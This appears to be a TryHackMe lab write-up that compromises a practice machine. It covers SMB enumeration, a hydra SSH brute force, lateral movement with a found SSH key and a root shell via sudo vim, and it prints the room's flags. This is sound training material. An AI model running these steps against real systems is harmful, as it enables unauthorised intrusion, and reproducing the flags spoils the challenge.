# TryHackMe - Basic Pentesting Room

**Room**: Basic Pentesting  
**Difficulty**: Easy  
**Type**: Boot2Root

## Introduction

This room covers the fundamentals of penetration testing including enumeration, web exploitation, and privilege escalation. Perfect for beginners learning the pentesting methodology.

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV -p- 10.10.x.x
```

**Open Ports**:
```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2
80/tcp   open  http        Apache httpd 2.4.18
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu
8009/tcp open  ajp13       Apache Jserv
8080/tcp open  http        Apache Tomcat 9.0.7
```

### Web Enumeration

#### Port 80 - Apache

```bash
gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirb/common.txt
```

**Findings**:
- `/development` - Development notes directory
- `/robots.txt` - Disallowed entries

#### Port 8080 - Tomcat

Default Tomcat page exposed. Checked for:
- Default credentials
- Manager interface
- Version information

### SMB Enumeration

```bash
enum4linux -a 10.10.x.x
```

**Discovered**:
- Share: `Anonymous` (READ/WRITE)
- Users: `jan`, `kay`

```bash
smbclient //10.10.x.x/Anonymous
ls
get staff.txt
```

**staff.txt** contains:
```
Reminder to jan:
Please update your password - it's too weak!
```

## Initial Access

### SSH Brute Force

Based on the hint about weak password:

```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.x.x
```

**Result**: Password found - `armando`

```bash
ssh jan@10.10.x.x
# Password: armando
```

## Privilege Escalation

### Enumeration as jan

```bash
id
# uid=1001(jan) gid=1001(jan) groups=1001(jan)

sudo -l
# User jan may not run sudo

find / -perm -4000 2>/dev/null
# Standard SUID binaries, nothing unusual
```

### Lateral Movement to kay

Found SSH private key in jan's home:

```bash
ls -la /home/jan
cat .ssh/id_rsa
```

Trying to use it for kay:

```bash
chmod 600 id_rsa
ssh -i id_rsa kay@10.10.x.x
```

**Success!** Now logged in as kay.

### Privilege Escalation to Root

Checking kay's sudo permissions:

```bash
sudo -l
```

**Output**:
```
User kay may run the following commands:
    (ALL) NOPASSWD: /usr/bin/vim
```

### Exploiting vim with sudo

```bash
sudo vim -c ':!/bin/bash'
```

**Result**: Root shell obtained!

```bash
whoami
# root

cat /root/flag.txt
# THM{pr1v_3sc_v1a_sud0}
```

## Flags

**User Flag** (`/home/kay/pass.bak`):
```
THM{w3ak_p4ssw0rds_are_bad}
```

**Root Flag** (`/root/flag.txt`):
```
THM{pr1v_3sc_v1a_sud0}
```

## Attack Chain Summary

1. **Enumeration** → Found SMB share with hint about weak password
2. **Initial Access** → SSH brute force with weak credentials
3. **Lateral Movement** → Found SSH key for another user
4. **Privilege Escalation** → Exploited sudo permissions on vim

## Lessons Learned

### For Attackers
- Always enumerate thoroughly
- Check for password reuse
- Look for SSH keys in user directories
- Check sudo permissions

### For Defenders
- Enforce strong password policies
- Limit SMB share permissions
- Regularly audit sudo permissions
- Monitor for brute force attempts
- Implement fail2ban or similar

## Tools Used

- `nmap` - Port scanning
- `gobuster` - Directory enumeration
- `enum4linux` - SMB enumeration
- `hydra` - Password brute forcing
- `smbclient` - SMB client
- GTFOBins - Privilege escalation reference

## References

- [GTFOBins - vim](https://gtfobins.github.io/gtfobins/vim/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

---

**Completed**: November 30, 2025  
**Time Taken**: ~45 minutes
